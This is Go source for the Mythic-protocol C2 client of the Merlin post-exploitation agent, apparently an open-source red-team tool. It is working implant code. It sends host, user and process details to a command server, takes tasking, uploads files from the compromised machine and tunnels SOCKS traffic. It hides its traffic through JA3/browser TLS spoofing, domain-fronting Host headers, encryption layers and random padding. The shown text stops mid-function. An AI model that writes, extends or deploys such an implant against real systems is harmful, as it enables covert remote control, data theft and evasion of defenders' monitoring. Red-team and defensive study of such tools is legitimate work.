//go:build mythic

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package mythic

import (
	// Standard
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	rand2 "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	// 3rd Party
	"github.com/google/uuid"

	// X-Packages
	"golang.org/x/net/http2"

	// Merlin Message
	messages "github.com/Ne0nd0g/merlin-message"
	"github.com/Ne0nd0g/merlin-message/jobs"
	rsa2 "github.com/Ne0nd0g/merlin-message/rsa"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/authenticators"
	rsaAuthenticaor "github.com/Ne0nd0g/merlin-agent/v2/authenticators/rsa"
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	merlinHTTP "github.com/Ne0nd0g/merlin-agent/v2/http"
	"github.com/Ne0nd0g/merlin-agent/v2/http/utls"
	"github.com/Ne0nd0g/merlin-agent/v2/services/agent"
	transformer "github.com/Ne0nd0g/merlin-agent/v2/transformers"
	b64 "github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/base64"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/gob"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/hex"
	mythicEncoder "github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/mythic"
	aes2 "github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/aes"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/jwe"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/rc4"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/xor"
)

// socksConnection is used to map the Mythic incremental integer used for tracking connections to a UUID leveraged by the agent
var socksConnection = sync.Map{}

// mythicSocksConnection is used to map Merlin's connection UUID to Mythic's integer server_id; Inverse of socksConnection
var mythicSocksConnection = sync.Map{}

// socksCounter is used to track and order the SOCKS data packets coming from Mythic
var socksCounter = sync.Map{}

// Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
type Client struct {
	Authenticator authenticators.Authenticator
	authenticated bool              // authenticated tracks if the Agent has successfully authenticated
	AgentID       uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
	MythicID      uuid.UUID         // The identifier used by the Mythic framework
	Client        merlinHTTP.Client // Client to send messages with
	ClientType    merlinHTTP.Type
	Protocol      string                    // The HTTP protocol the client will use
	URL           string                    // URL to send messages to (e.g., https://127.0.0.1:443/test.php)
	Host          string                    // HTTP Host header value
	Proxy         string                    // Proxy string
	Headers       map[string]string         // Additional HTTP headers to add to the request
	UserAgent     string                    // HTTP User-Agent value
	PaddingMax    int                       // PaddingMax is the maximum size allowed for a randomly selected message padding length
	JA3           string                    // JA3 is a string that represents how the TLS client should be configured, if applicable
	Parrot        string                    // Parrot is a feature of the github.com/refraction-networking/utls to mimic a specific browser
	psk           []byte                    // PSK is the Pre-Shared Key secret the agent will use to start encrypted key exchange
	secret        []byte                    // Secret is the current key that is being used to encrypt & decrypt data
	privKey       *rsa.PrivateKey           // Agent's RSA Private key to decrypt traffic
	insecureTLS   bool                      // insecureTLS is a boolean that determines if the InsecureSkipVerify flag is set to true or false
	transformers  []transformer.Transformer // Transformers an ordered list of transforms (encoding/encryption) to apply when constructing a message
}

// Config is a structure used to pass in all necessary information to instantiate a new Client
type Config struct {
	AgentID      uuid.UUID // The Agent's UUID
	AuthPackage  string    // AuthPackage is the type of authentication the agent should use when communicating with the server
	PayloadID    string    // The UUID used with the Mythic framework
	Protocol     string    // Proto contains the transportation protocol the agent is using (i.e., http2 or http3)
	Headers      string    // Headers is a new-line separated string of additional HTTP headers to add to client requests
	Host         string    // Host is used with the HTTP Host header for Domain Fronting activities
	URL          string    // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
	Proxy        string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
	UserAgent    string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
	PSK          string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
	JA3          string    // JA3 is a string that represents how the TLS client should be configured, if applicable
	Parrot       string    // Parrot is a feature of the github.com/refraction-networking/utls to mimic a specific browser
	Padding      string    // Padding is the max amount of data that will be randomly selected and appended to every message
	InsecureTLS  bool      // InsecureTLS is a boolean that determines if the InsecureSkipVerify flag is set to true or false
	Transformers string    // Transformers is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
	ClientType   string    // ClientType is the type of WINDOWS http client to use (e.g., WinINet, WinHTTP, etc.)
}

// New instantiates and returns a Client constructed from the passed in Config
func New(config Config) (*Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.New()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Config: %+v", config))
	client := Client{
		AgentID:     config.AgentID,
		URL:         config.URL,
		UserAgent:   config.UserAgent,
		Host:        config.Host,
		Protocol:    config.Protocol,
		Proxy:       config.Proxy,
		JA3:         config.JA3,
		Parrot:      config.Parrot,
		insecureTLS: config.InsecureTLS,
	}

	// Mythic: Add payload ID
	var err error
	client.MythicID, err = uuid.Parse(config.PayloadID)
	if err != nil {
		return &client, err
	}

	// Set PSK
	if config.PSK != "" {
		client.psk, err = base64.StdEncoding.DecodeString(config.PSK)
		if err != nil {
			return &client, fmt.Errorf("there was an error Base64 decoding the PSK:\n%s", err)
		}
		client.secret = client.psk
	}

	// Set up the Authenticator
	switch strings.ToLower(config.AuthPackage) {
	case "none":
		return nil, fmt.Errorf("the 'none' authenticator is not supported for the Mythic client")
	case "opaque":
		return nil, fmt.Errorf("the 'opaque' authenticator is not supported for the Mythic client")
	case "rsa":
		// Generate an RSA key pair
		client.privKey, err = rsa.GenerateKey(rand.Reader, 4096)
		if err != nil {
			return &client, fmt.Errorf("there was an error generating the RSA key pair:\n%s", err)
		}
		client.Authenticator = rsaAuthenticaor.New(client.AgentID, *client.privKey)
	default:
		return nil, fmt.Errorf("'%s' is not a valid authenticator for the Mythic client", config.AuthPackage)
	}

	// Transformers
	transforms := strings.Split(config.Transformers, ",")
	for _, transform := range transforms {
		var t transformer.Transformer
		switch strings.ToLower(transform) {
		case "aes":
			// Ensure there is a key
			if config.PSK == "" || len(client.psk) <= 0 {
				return nil, fmt.Errorf("AES transformer requires a PSK to be set")
			}
			t = aes2.NewEncrypter()
		case "base64-byte":
			t = b64.NewEncoder(b64.BYTE)
		case "base64-string":
			t = b64.NewEncoder(b64.STRING)
		case "gob-base":
			t = gob.NewEncoder(gob.BASE)
		case "gob-string":
			t = gob.NewEncoder(gob.STRING)
		case "hex-byte":
			t = hex.NewEncoder(hex.BYTE)
		case "hex-string":
			t = hex.NewEncoder(hex.STRING)
		case "jwe":
			t = jwe.NewEncrypter()
		case "mythic":
			t = mythicEncoder.NewEncoder()
		case "rc4":
			t = rc4.NewEncrypter()
		case "xor":
			t = xor.NewEncrypter()
		default:
			err = fmt.Errorf("clients/mythic.New(): unhandled transform type: %s", transform)
			if err != nil {
				return nil, err
			}
		}
		client.transformers = append(client.transformers, t)
	}

	// Parse Padding Value
	client.PaddingMax, err = strconv.Atoi(config.Padding)
	if err != nil {
		cli.Message(cli.WARN, fmt.Sprintf("there was an error converting Padding string \"%s\" to an integer: %s", config.Padding, err))
	}

	// Parse additional HTTP Headers
	if config.Headers != "" {
		client.Headers = make(map[string]string)
		for _, header := range strings.Split(config.Headers, "\n") {
			h := strings.Split(header, ":")
			if len(h) < 2 {
				cli.Message(cli.DEBUG, fmt.Sprintf("unable to parse HTTP header: '%s'", header))
				continue
			}
			// Remove leading or trailing spaces
			headerKey := strings.TrimSuffix(strings.TrimPrefix(h[0], " "), " ")
			headerValue := strings.TrimSuffix(strings.TrimPrefix(h[1], " "), " ")
			cli.Message(
				cli.DEBUG,
				fmt.Sprintf("HTTP Header (%d): %s, Value (%d): %s\n",
					len(headerKey),
					headerKey,
					len(headerValue),
					headerValue,
				),
			)
			client.Headers[headerKey] = headerValue
		}
	}

	// Determine the HTTP client type
	if client.Protocol == "http" || client.Protocol == "https" {
		if config.ClientType == strings.ToLower("winhttp") {
			client.ClientType = merlinHTTP.WINHTTP
		} else if config.ClientType == strings.ToLower("wininet") {
			client.ClientType = merlinHTTP.WININET
		} else {
			client.ClientType = merlinHTTP.HTTP
		}
	}

	if client.Protocol == "h2" || client.Protocol == "h2c" {
		client.ClientType = merlinHTTP.HTTP2
	}

	if client.Protocol == "http3" {
		client.ClientType = merlinHTTP.HTTP3
	}

	// If JA3 or Parrot was set, override the client type forcing HTTP/1.1 using the uTLS client
	if client.JA3 != "" {
		client.ClientType = merlinHTTP.JA3
	} else if client.Parrot != "" {
		client.ClientType = merlinHTTP.PARROT
	}

	// Build HTTP client config
	httpConfig := merlinHTTP.Config{
		ClientType: client.ClientType,
		Insecure:   client.insecureTLS,
		JA3:        client.JA3,
		Parrot:     client.Parrot,
		Protocol:   client.Protocol,
		ProxyURL:   client.Proxy,
	}

	// Get the HTTP client
	client.Client, err = merlinHTTP.NewHTTPClient(httpConfig)
	if err != nil {
		return &client, err
	}

	cli.Message(cli.INFO, "Client information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tMythic Payload ID: %s", client.MythicID))
	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Client Type: %s", client.ClientType))
	cli.Message(cli.INFO, fmt.Sprintf("\tAuthenticator: %s", client.Authenticator))
	cli.Message(cli.INFO, fmt.Sprintf("\tTransforms: %+v", client.transformers))
	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %s", client.URL))
	cli.Message(cli.INFO, fmt.Sprintf("\tUser-Agent: %s", client.UserAgent))
	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Host Header: %s", client.Host))
	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Headers: %s", client.Headers))
	cli.Message(cli.INFO, fmt.Sprintf("\tProxy: %s", client.Proxy))
	cli.Message(cli.INFO, fmt.Sprintf("\tPayload Padding Max: %d", client.PaddingMax))
	cli.Message(cli.INFO, fmt.Sprintf("\tJA3 String: %s", client.JA3))
	cli.Message(cli.INFO, fmt.Sprintf("\tParrot String: %s", client.Parrot))
	cli.Message(cli.INFO, fmt.Sprintf("\tInsecure TLS: %t", client.insecureTLS))

	return &client, nil
}

// Authenticate executes the configured authentication method sending the necessary messages to the server to
// complete authentication.
// This function takes in a Base message for when the server returns information to continue
// the process or needs to re-authenticate.
func (client *Client) Authenticate(msg messages.Base) (err error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Authenticate()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Input Merlin message base:\n%+v", msg))

	client.authenticated = false
	var authenticated bool

	// Repeat until authenticator is complete and Agent is authenticated
	for {
		msg, authenticated, err = client.Authenticator.Authenticate(msg)
		if err != nil {
			return
		}
		// An empty message was received indicating to exit the function
		if msg.Type == 0 {
			return
		}

		// Once authenticated, update the client's secret used to encrypt messages
		if authenticated {
			client.authenticated = true
			var key []byte
			key, err = client.Authenticator.Secret()
			if err != nil {
				return
			}
			// Don't update the secret if the authenticator returned an empty key
			if len(key) > 0 {
				client.secret = key
			}
			// Mythic returns a new UUID after authentication has been completed
			client.MythicID = msg.ID
			cli.Message(cli.SUCCESS, fmt.Sprintf("%s authentication completed", client.Authenticator))
			return
		}

		// Send the message to the server
		var msgs []messages.Base
		msgs, err = client.Send(msg)
		if err != nil {
			return
		}

		// Add a response message to the next loop iteration
		if len(msgs) > 0 {
			msg = msgs[0]
		}

		// If the Agent is authenticated, exit the loop and continue
		if authenticated {
			return
		}
	}
}

// Listen waits for incoming data on an established connection, deconstructs the data into a Base messages, and returns them
func (client *Client) Listen() (returnMessages []messages.Base, err error) {
	err = fmt.Errorf("clients/mythic.Listen(): the Mythic HTTP client does not support the Listen function")
	return
}

// Synchronous identifies if the client connection is synchronous or asynchronous, used to determine how and when messages
// can be sent/received.
func (client *Client) Synchronous() bool {
	return false
}

// Send takes in a Merlin message structure, performs any encoding or encryption, and sends it to the server
// The function also decodes and decrypts response messages and return a Merlin message structure.
// This is where the client's logic is for communicating with the server.
func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Send()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("input message base:\n%+v", m))

	// Set the message padding
	if client.PaddingMax > 0 {
		m.Padding = core.RandStringBytesMaskImprSrc(rand2.Intn(client.PaddingMax))
	}
	cli.Message(cli.DEBUG, fmt.Sprintf("Added message padding size: %d", len(m.Padding)))

	payload, err := client.Construct(m)
	if err != nil {
		err = fmt.Errorf("there was an error converting the Merlin message to a Mythic message:\n%s", err)
		return
	}

	// File Transfer messages are recursively processed and completed through the prior call to convertToMythicMessage()
	// Therefore, we can return here
	// If there was more than one job in the message, the returned "payload" will not be empty
	if m.Type == messages.JOBS && len(payload) == 0 {
		j := m.Payload.([]jobs.Job)
		for _, v := range j {
			if v.Type == jobs.FILETRANSFER {
				f := j[0].Payload.(jobs.FileTransfer)
				// When true, the AGENT is downloading the file to the Server; the operator issued the "download" command
				if f.IsDownload {
					returnMessages = append(returnMessages, messages.Base{ID: client.AgentID, Type: messages.IDLE})
					return
				}
			}
		}
	}

	// Build the request
	req, err := http.NewRequest("POST", client.URL, bytes.NewReader(payload))
	if err != nil {
		err = fmt.Errorf("there was an error building the HTTP request:\n%s", err)
		return
	}

	// Add HTTP headers
	if req != nil {
		req.Header.Set("User-Agent", client.UserAgent)
		if client.Host != "" {
			req.Host = client.Host
		}
	}
	for header, value := range client.Headers {
		req.Header.Set(header, value)
	}

	// Send the request
	cli.Message(cli.DEBUG, fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, client.URL))
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request:\n%+v", req))
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request Payload:\n%+v", req.Body))
	resp, err := client.Client.Do(req)
	if err != nil {
		err = fmt.Errorf("there was an error sending a message to the server:\n%s", err)
		return
	}
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Response:\n%+v", resp))
	// Process the response

	// Check the status code
	switch resp.StatusCode {
	case 200:
	default:
		err = fmt.Errorf("there was an error communicating with the server:\n%d", resp.StatusCode)
		return
	}

	// Check to make sure message response contained data
	if resp.ContentLength == 0 {
		err = fmt.Errorf("the response message did not contain any data")
		return
	}

	// Read the response body
	respData, err := io.ReadAll(resp.Body)
	if err != nil {
		err = fmt.Errorf("there was an error reading the HTTP payload response message:\n%s", err)
		return
	}
	return client.Deconstruct(respData)
}

// Initial executes the specific steps required to establish a connection with the C2 server and checkin or register an agent
func (client *Client) Initial() (err error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Initial()...")

	as := agent.NewAgentService()
	a := as.Get()

	// Mythic requires a specific agent Checkin message format after authentication
	// Build an initial checkin message
	checkIn := CheckIn{
		Action:    "checkin",
		IP:        selectIP(a.Host().IPs),
		OS:        a.Host().Platform,
		User:      a.Process().UserName,
		Host:      a.Host().Name,
		Process:   a.Process().Name,
		PID:       a.Process().ID,
		PayloadID: client.MythicID.String(), // Need to set now because it will be changed to tempUUID from RSA key exchange
		Arch:      a.Host().Architecture,
		Domain:    a.Process().Domain,
		Integrity: a.Process().Integrity,
	}

	// Authenticate the Agent
	err = client.Authenticate(messages.Base{})
	if err != nil {
		return
	}

	// Send checkin message
	base := messages.Base{
		ID:      client.AgentID,
		Type:    messages.CHECKIN,
		Payload: checkIn,
	}

	_, err = client.Send(base)

	return
}

// Set is a generic function used to modify a Client's field values
func (client *Client) Set(key string, value string) error {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Set()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
	var err error
	switch strings.ToLower(key) {
	case "ja3":
		ja3String := strings.Trim(value, "\"'")
		client.Client, err = getClient(client.Protocol, client.Proxy, ja3String, client.Parrot, client.insecureTLS)
		if ja3String != "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Set agent JA3 signature to:%s", ja3String))
		} else if ja3String == "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Setting agent client back to default using %s protocol", client.Protocol))
		}
		client.JA3 = ja3String
	case "paddingmax":
		client.PaddingMax, err = strconv.Atoi(value)
	case "parrot":
		parrot := strings.Trim(value, "\"'")
		client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, parrot, client.insecureTLS)
		if parrot != "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Set agent HTTP transport parrot to:%s", parrot))
		} else if parrot == "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Setting agent client back to default using %s protocol", client.Protocol))
		}
		client.Parrot = parrot
	default:
		err = fmt.Errorf("unknown mythic client setting: %s", key)
	}
	return err
}

// Get is a generic function that is used to retrieve the value of a Client's field
func (client *Client) Get(key string) string {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Get()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s", key))
	switch strings.ToLower(key) {
	case "ja3":
		return client.JA3
	case "paddingmax":
		return strconv.Itoa(client.PaddingMax)
	case "parrot":
		return client.Parrot
	case "protocol":
		return client.Protocol
	default:
		return fmt.Sprintf("unknown mythic client configuration setting: %s", key)
	}
}

// getClient returns an HTTP client for the passed protocol, proxy, and ja3 string
func getClient(protocol string, proxyURL string, ja3 string, parrot string, insecure bool) (*http.Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.getClient()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Protocol: %s, Proxy: %s, JA3 String: %s, Parrot: %s", protocol, proxyURL, ja3, parrot))
	/* #nosec G402 */
	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
	// Setup TLS configuration
	TLSConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: insecure, // #nosec G402 - intentionally configurable to allow self-signed certificates. See https://github.com/Ne0nd0g/merlin/issues/59
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
	}

	// Proxy
	proxyFunc, errProxy := getProxy(protocol, proxyURL)
	if errProxy != nil {
		return nil, errProxy
	}

	// JA3
	if ja3 != "" {
		transport, err := utls.NewTransportFromJA3(ja3, insecure, proxyFunc)
		if err != nil {
			return nil, err
		}
		return &http.Client{Transport: transport}, nil
	}

	// Parrot - If a JA3 string was set, it will be used, and the parroting will be ignored
	if parrot != "" {
		// Build the transport
		transport, err := utls.NewTransportFromParrot(parrot, insecure, proxyFunc)
		if err != nil {
			return nil, err
		}
		return &http.Client{Transport: transport}, nil
	}

	var transport http.RoundTripper
	switch strings.ToLower(protocol) {
	case "h2":
		TLSConfig.NextProtos = []string{"h2"} // https://www.iana.org/assignments/tls-extensiontype-values/tls-extensiontype-values.xhtml#alpn-protocol-ids
		transport = &http2.Transport{
			TLSClientConfig: TLSConfig,
		}
	case "h2c":
		transport = &http2.Transport{
			AllowHTTP: true,
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return net.Dial(network, addr)
			},
		}
	case "https":
		TLSConfig.NextProtos = []string{"http/1.1"} // https://www.iana.org/assignments/tls-extensiontype-values/tls-extensiontype-values.xhtml#alpn-protocol-ids
		transport = &http.Transport{
			TLSClientConfig: TLSConfig,
			MaxIdleConns:    10,
			Proxy:           proxyFunc,
			IdleConnTimeout: 1 * time.Nanosecond,
		}
	case "http":
		transport = &http.Transport{
			MaxIdleConns:    10,
			Proxy:           proxyFunc,
			IdleConnTimeout: 1 * time.Nanosecond,
		}
	default:
		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
	}
	return &http.Client{Transport: transport}, nil
}

// Deconstruct takes in a byte array that is unmarshalled from a JSON structure to Mythic structure, and
// then it is subsequently converted into a Merlin messages.Base structure
func (client *Client) Deconstruct(data []byte) (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Deconstruct()...")

	// Transforms
	for _, t := range client.transformers {
		var ret any
		if t.String() == "mythic" {
			ret, err = t.Deconstruct(data, []byte(client.MythicID.String()))
			data = ret.([]byte)
		} else {
			ret, err = t.Deconstruct(data, client.secret)
			data = ret.([]byte)
		}
		if err != nil {
			err = fmt.Errorf("there was an error transforming the Mythic message:\n%s", err)
			return
		}
	}

	cli.Message(cli.DEBUG, fmt.Sprintf("Decrypted JSON:\n%s", data))

	// Determine the action, so we know what structure to unmarshal to
	var action string
	if bytes.Contains(data, []byte("\"action\":\"checkin\"")) {
		action = CHECKIN
	} else if bytes.Contains(data, []byte("\"action\":\"get_tasking\"")) {
		action = TASKING
	} else if bytes.Contains(data, []byte("\"action\":\"post_response\"")) {
		action = RESPONSE
	} else if bytes.Contains(data, []byte("\"action\":\"staging_rsa\"")) {
		action = RSAStaging
	} else if bytes.Contains(data, []byte("\"action\":\"upload\"")) {
		action = UPLOAD
	} else {
		err = fmt.Errorf("message did not contain a known action:\n%s", data)
		return
	}

	returnMessage := messages.Base{
		ID:   client.AgentID,
		Type: messages.IDLE,
	}

	// Logic for processing or converting Mythic messages
	cli.Message(cli.DEBUG, fmt.Sprintf("Action: %s", action))
	switch action {
	case CHECKIN:
		var msg Response
		// Unmarshal the JSON message
		err = json.Unmarshal(data, &msg)
		if err != nil {
			err = fmt.Errorf("there was an error unmarshalling the JSON object in the message handler:\n%s", err)
			return
		}
		if msg.Status == "success" {
			cli.Message(cli.SUCCESS, "Initial checkin successful")
			client.MythicID = uuid.MustParse(msg.ID)
			return
		}
		err = fmt.Errorf("unknown checkin action status:\n%+v", msg)
		return
	case RSAStaging:
		// https://docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin#eke-by-generating-client-side-rsa-keys
		var msg rsa2.Response
		err = json.Unmarshal(data, &msg)
		if err != nil {
			err = fmt.Errorf("there was an error unmarshalling the JSON object to mythic.RSAResponse in the message handler:\n%s", err)
			return
		}
		returnMessage.Type = messages.KEYEXCHANGE
		returnMessage.Payload = msg
		returnMessages = append(returnMessages, returnMessage)
	case TASKING:
		var msg Tasks
		// Unmarshal the JSON message
		err = json.Unmarshal(data, &msg)
		if err != nil {
			err = fmt.Errorf("there was an error unmarshalling the JSON object to mythic.Tasks in the message handler:\n%s", err)
			return
		}
		// If there are any tasks/jobs, add them
		if len(msg.Tasks) > 0 {
			cli.Message(cli.DEBUG, fmt.Sprintf("returned Mythic tasks:\n%+v", msg))
			returnMessage, err = client.convertTasksToJobs(msg.Tasks)
			if err != nil {
				return
			}
			returnMessages = append(returnMessages, returnMessage)
		}
		// SOCKS5
		if len(msg.SOCKS) > 0 {
			// There is SOCKS data to send to the SOCKS server
			returnMessage, err = client.convertSocksToJobs(msg.SOCKS)
			if err != nil {
				cli.Message(cli.WARN, err.Error())
			}
			if len(returnMessage.Payload.([]jobs.Job)) > 0 {
				returnMessages = append(returnMessages, returnMessage)
			}
		}
	case RESPONSE:
		// https://docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/action-post_response
		var msg ServerPostResponse
		err = json.Unmarshal(data, &msg)
		if err != nil {
			err = fmt.Errorf("there was an error unmarshalling the JSON object to a mythic.ServerTaskResponse structure in the message handler:\n%s", err)
			return
		}
		// SOCKS5
		if len(msg.SOCKS) > 0 {
			// There is SOCKS data to send to the SOCKS server
			returnMessage, err = client.convertSocksToJobs(msg.SOCKS)
			if err != nil {
				cli.Message(cli.WARN, err.Error())
			}
			if len(returnMessage.Payload.([]jobs.Job)) > 0 {
				returnMessages = append(returnMessages, returnMessage)
			}
		}
		cli.Message(cli.DEBUG, fmt.Sprintf("post_response results from the server: %+v", msg))
		for _, response := range msg.Responses {
			if response.Error != "" {
				cli.Message(cli.WARN, fmt.Sprintf("There was an error sending a task to the Mythic server:\n%+v", response))
			}
			if response.FileID != "" {
				cli.Message(cli.DEBUG, fmt.Sprintf("Mythic FileID: %s", response.FileID))
				if response.Status == "success" {
					job := jobs.Job{
						AgentID: client.AgentID,
						ID:      response.ID,
						Type:    DownloadSend,
						Payload: response.FileID,
					}
					returnMessage.Type = messages.JOBS
					returnMessage.Payload = []jobs.Job{job}
					returnMessages = append(returnMessages, returnMessage)
				}
			}
			if response.Status == "success" && response.ID != "" {
				returnMessage.Token = response.ID
				returnMessage.Type = messages.IDLE
				returnMessages = append(returnMessages, returnMessage)
			}
		}
		return
	default:
		err = fmt.Errorf("unknown Mythic action: %s", action)
		return
	}
	return
}

// Construct takes in Merlin message base, converts it into to a Mythic message JSON structure,
// encrypts it, prepends the Mythic UUID, and Base64 encodes the entire string
func (client *Client) Construct(m messages.Base) ([]byte, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Construct()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Input Merlin message base:\n %+v", m))

	var err error
	var data []byte

	switch m.Type {
	case messages.CHECKIN:
		// Send the very first checkin message
		if m.Payload != nil {
			msg := m.Payload.(CheckIn)
			msg.Padding = m.Padding
			// Marshal the structure to a JSON object
			data, err = json.Marshal(msg)
			if err != nil {
				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.CheckIn structrong to JSON:\n%s", err)
			}
		} else { // Merlin had no responses to send back
			task := Tasking{
				Action:  TASKING,
				Size:    -1,
				Padding: m.Padding,
			}
			// Marshal the structure to a JSON object
			data, err = json.Marshal(task)
			if err != nil {
				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.CheckIn structure to JSON:\n%s", err)
			}
		}
	case messages.JOBS:
		returnMessage := PostResponse{
			Action:    RESPONSE,
			Padding:   m.Padding,
			SOCKS:     []Socks{},
			Responses: []ClientTaskResponse{},
		}
		// Convert Merlin jobs to mythic response
		for _, job := range m.Payload.([]jobs.Job) {
			var response ClientTaskResponse
			if job.ID != "" {
				response.ID = uuid.MustParse(job.ID)
			}
			response.Completed = true
			cli.Message(cli.DEBUG, fmt.Sprintf("Converting Merlin job type: %d to Mythic response", job.Type))
			switch job.Type {
			case jobs.RESULT:
				response.Output = job.Payload.(jobs.Results).Stdout
				if job.Payload.(jobs.Results).Stderr != "" {
					response.Output += job.Payload.(jobs.Results).Stderr
					response.Status = StatusError
				}
				returnMessage.Responses = append(returnMessage.Responses, response)
			case jobs.AGENTINFO:
				info, err := json.Marshal(job.Payload)
				if err != nil {
					response.Output = fmt.Sprintf("there was an error marshalling the AgentInfo structure to JSON:\n%s", err)
					response.Status = StatusError
				}
				response.Output = string(info)
				returnMessage.Responses = append(returnMessage.Responses, response)
			case jobs.FILETRANSFER:
				f := job.Payload.(jobs.FileTransfer)
				// Download https://docs.mythic-c2.net/customizing/hooking-features/download
				if f.IsDownload {
					// DownloadInit - Get FileID from Mythic
					// 1. PostResponse - Added in the convertToMythicMessage() function on the switch for DownloadSend
					// 2. ClientTaskResponse
					// 3. FileDownload
					fm := FileDownload{
						NumChunks: 1,
						FullPath:  f.FileLocation,
					}

					ctr := ClientTaskResponse{
						ID:       response.ID,
						Download: &fm,
					}

					downloadMessage := messages.Base{
						ID:      client.AgentID,
						Type:    DownloadInit,
						Payload: ctr,
					}

					resp, err := client.Send(downloadMessage)
					if err != nil {
						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): There was an error sending the mythic FileDownload:DownloadInit message to the server: %s", err)
					}

					// Get the file ID from the response
					if len(resp) <= 0 {
						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): The were no return messages after requesting a FileID from Mythic")
					}
					if resp[0].Type != messages.JOBS {
						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): The first message in the response for DownloadInit was not a jobs message")
					}
					js := resp[0].Payload.([]jobs.Job)
					if len(js) <= 0 {
						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): The first message in the response for DownloadInit did not contain any jobs")
					}
					if js[0].Type != DownloadSend {
						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): Expected the first job to be a DownloadSend(%d) job but received %d", DownloadSend, js[0].Type)
					}

					// TODO Chunk the data
					// DownloadSend - Send actual data
					fm2 := FileDownload{
						Data:   f.FileBlob,
						FileID: js[0].Payload.(string),
						Chunk:  1,
					}

					ctr.Download = &fm2
					ctr.Completed = true

					downloadMessage.Type = DownloadSend
					downloadMessage.Payload = ctr
					resp, err = client.Send(downloadMessage)
					if err != nil {
						return []byte{}, fmt.Errorf("there was an error sending the mythic FileDownload:DownloadSend message to the server: %s", err)
					}
					// If this is the only job, then return; else keep processing remaining jobs
					if len(m.Payload.([]jobs.Job)) == 1 {
						return []byte{}, nil
					}
				}
			case jobs.SOCKS:
				sockMsg := job.Payload.(jobs.Socks)
				// SOCKS server's initial response is 0x05, 0x00
				if bytes.Equal(sockMsg.Data, []byte{0x05, 0x00}) {
					// Drop the job because Mythic doesn't need it for anything and we are spoofing the SOCKS handshake agent side
					break
				}

				sock := Socks{
					Exit: sockMsg.Close,
				}
